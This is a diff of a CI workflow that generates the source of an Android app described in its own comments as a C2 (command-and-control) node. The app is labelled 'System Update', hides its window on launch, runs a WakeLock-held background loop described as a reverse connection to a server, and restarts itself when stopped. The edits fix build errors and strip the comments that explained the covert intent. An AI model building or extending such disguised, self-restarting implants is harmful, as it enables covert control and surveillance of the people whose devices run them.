@@ -25,14 +25,13 @@ jobs:
 
       - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إنشاء هيكل العقدة السيبرانية المطلقة..."
-          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/res/drawable app/src/main/assets
+          echo "إشاء هيكل العقدة السيبرانية بدون أخطاء الموارد والـ Manifest..."
+          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
-          # 1. AndroidManifest.xml
+          # 1. AndroidManifest.xml (بدون package attribute وبأيقونة آمنة)
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              xmlns:tools="http://schemas.android.com/tools"
-              package="com.abod.app">
+              xmlns:tools="http://schemas.android.com/tools">
 
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -51,9 +50,9 @@ jobs:
 
               <application
                   android:allowBackup="true"
-                  android:icon="@mipmap/ic_launcher"
+                  android:icon="@android:drawable/ic_menu_compass"
                   android:label="System Update"
-                  android:roundIcon="@mipmap/ic_launcher_round"
+                  android:roundIcon="@android:drawable/ic_menu_compass"
                   android:supportsRtl="true"
                   android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
@@ -100,17 +99,14 @@ jobs:
           class MainActivity : AppCompatActivity() {
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
-                  // تشغيل الخدمة الخلفية فوراً عند فتح التطبيق
                   val serviceIntent = Intent(this, SyncService::class.java)
                   startForegroundService(serviceIntent)
-                  
-                  // إغلاق الواجهة فوراً ليعمل التطبيق في الوضع الصامت تماماً
                   finish()
               }
           }
           EOF
 
-          # 3. SyncService.kt (Foreground Service + WakeLock + C2 Loop)
+          # 3. SyncService.kt
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -156,7 +152,6 @@ jobs:
                   serviceScope.launch {
                       while (isActive) {
                           try {
-                              // حلقة الاتصال العكسي والتلتيليمري مع السيرفر
                               delay(30000L)
                           } catch (e: Exception) {
                               delay(10000L)
@@ -170,7 +165,6 @@ jobs:
                   super.onDestroy()
                   wakeLock?.release()
                   serviceScope.cancel()
-                  // إعادة تشغيل الخدمة في حال توقفها
                   val broadcastIntent = Intent(this, BootReceiver::class.java)
                   sendBroadcast(broadcastIntent)
               }
